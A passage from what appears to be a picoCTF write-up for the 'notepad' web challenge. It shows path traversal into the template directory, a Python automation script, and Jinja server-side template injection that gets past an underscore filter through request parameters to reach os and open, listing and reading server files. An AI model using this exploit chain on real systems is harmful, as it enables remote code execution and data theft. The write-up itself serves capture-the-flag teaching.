{% endif %}
```
Let's try the flow once manually and then automate it.
We will paste the following note:
```
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg
This is a test
```
We use the first 128 characters to control where the note will be written to. We want it to be written to `/templates/errors`, and we fill up the rest of the 128 characters with fillers so that our "payload" (currently `This is a test` following directly after) doesn't get mixed in with the file name.
After posting this note, we get redirected to `https://notepad.mars.picoctf.net/templates/errors/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg-fY1TxE2Zt-M.html`. So we take the HTML file name, and visit:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/notepad]
└─$ curl https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg-fY1TxE2Zt-M
    error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg-fY1TxE2Zt-M
  ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg
This is a test
make a new note
```
We can see our payload included in the HTML response.
Now for some automation:
```python
import re, os
import requests
import html
from cmd import Cmd
from urllib.parse import urlparse
from pathlib import Path
BASE_URL = "https://notepad.mars.picoctf.net"
START_MARKER = "###START###"
END_MARKER = "###END###"
class MyPrompt(Cmd):
    def __init__(self):
        Cmd.__init__(self)
        self.marker_regex = re.compile(f"{START_MARKER}(.*){END_MARKER}")
    def do_exit(self, inp):
        return True
    def do_send(self, data):
        split_data = data.split(" ")
        payload = split_data.pop(0)
        params = "&" + split_data.pop(0) if split_data else ""
        file_url = "..\\templates\\errors\\".ljust(128, 'a')
        data = {
            "content": f"{file_url}\n{START_MARKER}{payload}{END_MARKER}"
        }
        r = requests.post(f"{BASE_URL}/new", data = data)
        if "?error=" in r.url:
            print(f"Error: Redirected to {r.url}")
            return
        new_file_name = Path(urlparse(r.url).path).stem
        r = requests.get(f"{BASE_URL}?error={new_file_name}{params}")
        match = self.marker_regex.search(r.text)
        print(html.unescape(match.group(1)))
MyPrompt().cmdloop()
```
This basically does the same thing, with a few added features:
 * Extracting just the payload from the HTML file using start and end markers
 * Allowing us to provide parameters to the page we are visiting (we'll use that soon)
Let's try it out:
```
(Cmd) send test
test
```
Since our payload gets interpreted as a Flask template, we can inject template syntax:
```
(Cmd) send {{request}}
```
We'll use it to try and execute the [known](https://gynvael.coldwind.pl/n/python_sandbox_escape) Python Sandbox escape to achieve RCE. For the first phase, we need to access the `__class__` of some Python object. However, we can't use this:
```
(Cmd) send {{request.__class__}}
Error: Redirected to https://notepad.mars.picoctf.net/?error=bad_content
```
This is since underscore is blocked:
```python
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
```
This is where the parameters come in. Instead of using `request.__class__`, we use `request[request.args.param1]` and send `param1=__class__`.
```
(Cmd) send {{request[request.args.param1]}} param1=__class__
```
We continue:
```
(Cmd) send {{request[request.args.param1][request.args.param2]}} param1=__class__&param2=__mro__
(, , , , , , , , , , , )
(Cmd) send {{request[request.args.param1][request.args.param2][11]}} param1=__class__&param2=__mro__
(Cmd) send {{request[request.args.param1][request.args.param2][11][request.args.param3]}} param1=__class__&param2=__mro_
_&param3=__subclasses__
(Cmd) send {{request[request.args.param1][request.args.param2][11][request.args.param3]()}} param1=__class__&param2=__mr
o__&param3=__subclasses__

(Cmd) send {{request[request.args.param1][request.args.param2][11][request.args.param3]()[183]}} param1=__class__&param2
=__mro__&param3=__subclasses__
(Cmd) send {{request[request.args.p1][request.args.p2][11][request.args.p3]()[183]()[request.args.p4][request.args.p5][request.args.p6]('os').listdir('.')}} p1=__class__&p2=__mro__&p3=__subclasses__&p4=_module&p5=__builtins__&p6=__import__
['templates', 'static', 'flag-c8f5526c-4122-4578-96de-d7dd27193798.txt', 'app.py']
```
Finally, we just need to send `{{request[request.args.p1][request.args.p2][11][request.args.p3]()[183]()[request.args.p4][request.args.p5]['open']('flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}}` in order to read the flag: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n} `